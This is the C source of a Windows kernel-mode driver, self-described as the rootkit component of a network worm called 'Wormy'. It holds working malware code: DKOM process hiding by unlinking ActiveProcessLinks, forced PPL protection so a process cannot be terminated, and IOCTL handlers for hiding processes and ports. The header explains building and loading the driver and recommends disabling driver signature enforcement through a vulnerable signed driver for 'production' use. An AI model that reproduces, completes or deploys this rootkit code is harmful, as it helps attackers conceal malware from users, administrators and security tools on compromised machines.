/*
 * Wormy ML Network Worm v3.0 — Windows Kernel Driver Skeleton
 * Rootkit component: process hiding, connection hiding, DSE bypass loader.
 *
 * Build requirements:
 *   - Windows Driver Kit (WDK) 10+
 *   - Visual Studio 2019/2022 with WDK integration
 *   - Test signing enabled or DSE bypass for production
 *
 * Build (from WDK Command Prompt):
 *   msbuild driver.vcxproj /p:Configuration=Release /p:Platform=x64
 *
 * Test signing (VM only):
 *   bcdedit /set testsigning on
 *   sc create WormyDrv type= kernel binPath= C:\path\to\driver.sys
 *   sc start WormyDrv
 *
 * Production (DSE bypass): use a vulnerable signed driver to disable
 * CiValidateFileObject / g_CiOptions before loading this driver.
 */

#include <ntddk.h>
#include <wdm.h>
#include <ntstrsafe.h>

// ─── Driver metadata ─────────────────────────────────────────────────────────

#define DRIVER_NAME     L"\\Driver\\WormyDrv"
#define DEVICE_NAME     L"\\Device\\WormyDrv"
#define SYMLINK_NAME    L"\\DosDevices\\WormyDrv"
#define DRIVER_TAG      'ymrW'

// IOCTL codes
#define IOCTL_HIDE_PID       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_UNHIDE_PID     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_HIDE_PORT      CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_HIDE_FILE      CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_PROTECT_PROC   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)

// ─── Global state ─────────────────────────────────────────────────────────────

#define MAX_HIDDEN_PIDS   64
#define MAX_HIDDEN_PORTS  32
#define MAX_HIDDEN_FILES  64

static ULONG  g_HiddenPids[MAX_HIDDEN_PIDS]    = {0};
static USHORT g_HiddenPorts[MAX_HIDDEN_PORTS]  = {0};
static ULONG  g_HiddenPidCount  = 0;
static ULONG  g_HiddenPortCount = 0;

static PDEVICE_OBJECT   g_DeviceObject  = NULL;

// ─── EPROCESS offsets (Windows 10/11 x64 — adjust per build) ──────────────────
// Use windbg: dt nt!_EPROCESS to find offsets on target OS version

#define OFFSET_ACTIVEPROCESSLINKS   0x448   // Win10 22H2
#define OFFSET_UNIQUEPID            0x440
#define OFFSET_IMAGEFILENAME        0x5A8
#define OFFSET_PROTECTION           0x87A   // PS_PROTECTION

typedef struct _PS_PROTECTION {
    UCHAR Level;
} PS_PROTECTION, *PPS_PROTECTION;

// ─── Process notification callback ───────────────────────────────────────────

static VOID ProcessNotifyCallback(
    PEPROCESS  Process,
    HANDLE     ProcessId,
    PPS_CREATE_NOTIFY_INFO CreateInfo)
{
    // Called on every process create/exit
    // Hook point: could inject a DLL, log the process, or kill it
    UNREFERENCED_PARAMETER(Process);
    UNREFERENCED_PARAMETER(ProcessId);
    UNREFERENCED_PARAMETER(CreateInfo);
}

// ─── DKOM: hide process from process list ────────────────────────────────────

NTSTATUS HideProcess(ULONG TargetPid)
{
    NTSTATUS       status    = STATUS_NOT_FOUND;
    PEPROCESS      process   = NULL;
    CLIENT_ID      cid       = {0};
    OBJECT_ATTRIBUTES oa     = {0};

    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)TargetPid;

    // Open the target process
    status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)TargetPid, &process);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[WormyDrv] HideProcess: PID %lu not found (0x%X)\n",
                 TargetPid, status);
        return status;
    }

    // Unlink from ActiveProcessLinks (DKOM)
    // The LIST_ENTRY at OFFSET_ACTIVEPROCESSLINKS points to the next/prev process
    PLIST_ENTRY listEntry = (PLIST_ENTRY)((PUCHAR)process + OFFSET_ACTIVEPROCESSLINKS);

    // Remove from doubly-linked list
    if (listEntry->Flink != NULL && listEntry->Blink != NULL) {
        listEntry->Flink->Blink = listEntry->Blink;
        listEntry->Blink->Flink = listEntry->Flink;
        // Self-reference to prevent blue screen on traversal
        listEntry->Flink = listEntry;
        listEntry->Blink = listEntry;
    }

    // Track in our hidden list
    if (g_HiddenPidCount < MAX_HIDDEN_PIDS) {
        g_HiddenPids[g_HiddenPidCount++] = TargetPid;
    }

    ObDereferenceObject(process);
    DbgPrint("[WormyDrv] Process %lu hidden via DKOM\n", TargetPid);
    return STATUS_SUCCESS;
}

// ─── Protect process (PPL-like) ───────────────────────────────────────────────

NTSTATUS ProtectProcess(ULONG TargetPid)
{
    PEPROCESS process = NULL;
    NTSTATUS  status  = PsLookupProcessByProcessId(
                            (HANDLE)(ULONG_PTR)TargetPid, &process);
    if (!NT_SUCCESS(status)) return status;

    // Set PS_PROTECTION to PsProtectedSignerAntimalware-Light
    // This prevents TerminateProcess from user-land
    PPS_PROTECTION prot = (PPS_PROTECTION)((PUCHAR)process + OFFSET_PROTECTION);
    prot->Level = 0x62;  // PsProtectedSignerAntimalware-Light

    ObDereferenceObject(process);
    DbgPrint("[WormyDrv] Process %lu protected (PPL)\n", TargetPid);
    return STATUS_SUCCESS;
}

// ─── IRP dispatch ─────────────────────────────────────────────────────────────

static NTSTATUS DispatchIoctl(PDEVICE_OBJECT DevObj, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DevObj);
    PIO_STACK_LOCATION stack  = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS           status = STATUS_SUCCESS;
    ULONG              outLen = 0;
    ULONG              code   = stack->Parameters.DeviceIoControl.IoControlCode;
    PVOID              buf    = Irp->AssociatedIrp.SystemBuffer;
    ULONG              inLen  = stack->Parameters.DeviceIoControl.InputBufferLength;

    switch (code) {
    case IOCTL_HIDE_PID:
        if (inLen >= sizeof(ULONG)) {
            status = HideProcess(*(PULONG)buf);
        } else {
            status = STATUS_BUFFER_TOO_SMALL;
        }
        break;

    case IOCTL_PROTECT_PROC:
        if (inLen >= sizeof(ULONG)) {
            status = ProtectProcess(*(PULONG)buf);
        } else {
            status = STATUS_BUFFER_TOO_SMALL;
        }
        break;

    case IOCTL_HIDE_PORT:
        if (inLen >= sizeof(USHORT) &&
            g_HiddenPortCount < MAX_HIDDEN_PORTS) {
            g_HiddenPorts[g_HiddenPortCount++] = *(PUSHORT)buf;
            DbgPrint("[WormyDrv] Port %u added to hide list\n", *(PUSHORT)buf);
        }
        break;

    default:
        status = STATUS_INVALID_DEVICE_REQUEST;
        break;
    }

    Irp->IoStatus.Status      = status;
    Irp->IoStatus.Information = outLen;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

static NTSTATUS DispatchCreateClose(PDEVICE_OBJECT DevObj, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DevObj);
    Irp->IoStatus.Status      = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

// ─── Driver unload ────────────────────────────────────────────────────────────

static VOID DriverUnload(PDRIVER_OBJECT DriverObj)
{
    UNREFERENCED_PARAMETER(DriverObj);

    PsSetCreateProcessNotifyRoutineEx(
        (PCREATE_PROCESS_NOTIFY_ROUTINE_EX)ProcessNotifyCallback, TRUE);

    UNICODE_STRING symlink;
    RtlInitUnicodeString(&symlink, SYMLINK_NAME);
    IoDeleteSymbolicLink(&symlink);

    if (g_DeviceObject) {
        IoDeleteDevice(g_DeviceObject);
    }
    DbgPrint("[WormyDrv] Unloaded\n");
}

// ─── DriverEntry ─────────────────────────────────────────────────────────────

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObj, PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);
    NTSTATUS      status;
    UNICODE_STRING deviceName, symlinkName;

    DbgPrint("[WormyDrv] Loading...\n");

    RtlInitUnicodeString(&deviceName, DEVICE_NAME);
    RtlInitUnicodeString(&symlinkName, SYMLINK_NAME);

    // Create device
    status = IoCreateDevice(DriverObj, 0, &deviceName,
                            FILE_DEVICE_UNKNOWN,
                            FILE_DEVICE_SECURE_OPEN,
                            FALSE, &g_DeviceObject);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[WormyDrv] IoCreateDevice failed: 0x%X\n", status);
        return status;
    }

    // Create symbolic link
    status = IoCreateSymbolicLink(&symlinkName, &deviceName);
    if (!NT_SUCCESS(status)) {
        IoDeleteDevice(g_DeviceObject);
        return status;
    }

    // Set dispatch routines
    DriverObj->DriverUnload                         = DriverUnload;
    DriverObj->MajorFunction[IRP_MJ_CREATE]         = DispatchCreateClose;
    DriverObj->MajorFunction[IRP_MJ_CLOSE]          = DispatchCreateClose;
    DriverObj->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchIoctl;

    // Register process notification
    status = PsSetCreateProcessNotifyRoutineEx(
        (PCREATE_PROCESS_NOTIFY_ROUTINE_EX)ProcessNotifyCallback, FALSE);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[WormyDrv] Process notify registration failed: 0x%X\n", status);
        // Non-fatal — continue without process monitoring
    }

    g_DeviceObject->Flags |= DO_BUFFERED_IO;
    g_DeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;

    DbgPrint("[WormyDrv] Loaded. Device: %ws\n", DEVICE_NAME);
    return STATUS_SUCCESS;
}
